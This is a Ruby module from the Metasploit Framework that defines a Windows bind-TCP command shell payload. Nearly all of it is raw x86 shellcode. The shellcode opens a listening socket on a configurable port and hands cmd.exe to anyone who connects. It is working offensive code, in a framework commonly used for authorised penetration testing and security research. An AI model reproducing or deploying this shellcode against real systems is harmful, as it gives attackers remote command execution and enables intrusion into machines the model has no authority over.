##
# $Id: shell_bind_tcp.rb 6479 2009-04-13 14:33:26Z kris $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'msf/core/handler/bind_tcp'


module Metasploit3

	include Msf::Payload::Windows
	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Windows Command Shell, Bind TCP Inline',
			'Version'       => '$Revision: 6479 $',
			'Description'   => 'Listen for a connection and spawn a command shell',
			'Author'        => 'vlad902',
			'License'       => MSF_LICENSE,
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::BindTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'Payload'       =>
				{
					'Offsets' =>
						{
							'LPORT'    => [ 162, 'n' ],
							'EXITFUNC' => [ 308, 'V' ],
						},
					'Payload' =>
						"\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c" +
						"\x24\x24\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b" +
						"\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01" +
						"\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d" +
						"\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f" +
						"\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb" +
						"\x03\x2c\x8b\x89\x6c\x24\x1c\x61\xc3\x31\xdb\x64" +
						"\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40" +
						"\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53" +
						"\x66\x68\x33\x32\x68\x77\x73\x32\x5f\x54\xff\xd0" +
						"\x68\xcb\xed\xfc\x3b\x50\xff\xd6\x5f\x89\xe5\x66" +
						"\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09" +
						"\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53" +
						"\x43\x53\xff\xd0\x66\x68\x11\x5c\x66\x53\x89\xe1" +
						"\x95\x68\xa4\x1a\x70\xc7\x57\xff\xd6\x6a\x10\x51" +
						"\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53" +
						"\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50" +
						"\x54\x54\x55\xff\xd0\x93\x68\xe7\x79\xc6\x79\x57" +
						"\xff\xd6\x55\xff\xd0\x66\x6a\x64\x66\x68\x63\x6d" +
						"\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89" +
						"\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93" +
						"\x8d\x7a\x38\xab\xab\xab\x68\x72\xfe\xb3\x16\xff" +
						"\x75\x44\xff\xd6\x5b\x57\x52\x51\x51\x51\x6a\x01" +
						"\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53" +
						"\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83" +
						"\xc4\x64\xff\xd6\x52\xff\xd0\x68\x7e\xd8\xe2\x73" +
						"\x53\xff\xd6\xff\xd0"

				}
			))
	end

end